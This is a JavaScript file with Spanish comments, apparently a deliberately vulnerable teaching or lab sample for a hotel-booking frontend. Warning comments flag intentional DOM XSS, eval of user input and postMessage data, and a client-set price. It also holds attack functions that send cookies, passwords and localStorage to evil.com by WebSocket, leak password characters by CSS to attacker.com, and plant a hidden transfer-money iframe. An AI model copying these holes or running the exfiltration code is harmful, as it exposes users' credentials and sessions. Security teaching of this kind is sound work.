// ⚠️ JAVASCRIPT CON MÚLTIPLES VULNERABILIDADES FRONTEND

// DOM-based XSS
function loadUserContent() {
    const userInput = window.location.hash.substring(1);
    
    // ⚠️ Peligro: innerHTML con entrada de usuario
    document.getElementById('dynamic-content').innerHTML = decodeURIComponent(userInput);
    
    // ⚠️ Eval con datos de usuario
    if (userInput.includes('{')) {
        try {
            const data = eval('(' + userInput + ')');
            processUserData(data);
        } catch (e) {
            console.error('Error:', e);
        }
    }
}

// CSRF: Peticiones sin tokens
function makeBooking(hotelId, price) {
    // ⚠️ El precio puede ser manipulado desde el cliente
    const finalPrice = document.getElementById('final-price')?.value || price;
    
    fetch('/api/index.php?action=make_reservation', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            hotel_id: hotelId,
            user_id: getCurrentUserId(),
            price: finalPrice,  // ⚠️ Precio enviado por el cliente
            dates: getSelectedDates()
        })
    })
    .then(response => response.json())
    .then(data => {
        alert('Reserva confirmada: ' + JSON.stringify(data));
    });
}

// Exfiltración de datos vía WebSockets
function stealData() {
    const ws = new WebSocket('wss://evil.com/ws');
    
    ws.onopen = function() {
        // Enviar cookies
        ws.send('Cookie: ' + document.cookie);
        
        // Enviar datos de formularios
        const inputs = document.querySelectorAll('input[type="password"], input[type="email"]');
        inputs.forEach(input => {
            ws.send(`${input.name}: ${input.value}`);
        });
        
        // Enviar localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            ws.send(`localStorage[${key}]: ${localStorage.getItem(key)}`);
        }
    };
}

// Clickjacking: iframe oculto
function createHiddenIframe() {
    const iframe = document.createElement('iframe');
    iframe.style.opacity = '0';
    iframe.style.position = 'absolute';
    iframe.style.top = '0';
    iframe.style.left = '0';
    iframe.style.width = '100%';
    iframe.style.height = '100%';
    iframe.style.zIndex = '-1';
    iframe.src = 'https://legitimate-site.com/transfer-money?amount=1000';
    document.body.appendChild(iframe);
}

// CSS Injection para exfiltración
function cssExfiltration() {
    const style = document.createElement('style');
    
    // ⚠️ Exfiltra valores de inputs mediante CSS
    style.textContent = `
        input[type="password"][value*="a"] {
            background-image: url("https://attacker.com/exfil?a");
        }
        input[type="password"][value*="b"] {
            background-image: url("https://attacker.com/exfil?b");
        }
        /* ... para cada carácter posible */
    `;
    
    document.head.appendChild(style);
}

// Carga insegura de scripts de terceros
function loadThirdPartyScripts() {
    // ⚠️ Sin integridad SRI
    const script = document.createElement('script');
    script.src = 'https://cdn.evil-library.com/malicious.js';
    document.head.appendChild(script);
    
    // ⚠️ JSONP inseguro
    const jsonp = document.createElement('script');
    jsonp.src = 'https://api.example.com/data?callback=handleData';
    document.head.appendChild(jsonp);
}

function handleData(data) {
    // ⚠️ Confía ciegamente en datos externos
    document.getElementById('external-data').innerHTML = data.content;
}

// PostMessage inseguro
window.addEventListener('message', function(event) {
    // ⚠️ Sin verificación de origen
    if (event.data.type === 'updateContent') {
        document.getElementById('content').innerHTML = event.data.html;
    }
    
    // ⚠️ Ejecuta código recibido
    if (event.data.command) {
        eval(event.data.command);
    }
});

// Exponer funciones globales peligrosas
window.evalUserCode = function(code) {
    return eval(code);  // ⚠️ Nunca hacer esto
};

window.executeInBackground = function(url) {
    // ⚠️ SSRF desde el cliente (aunque limitado)
    fetch(url)
        .then(response => response.text())
        .then(data => {
            console.log('Response from', url, ':', data.substring(0, 100));
        });
};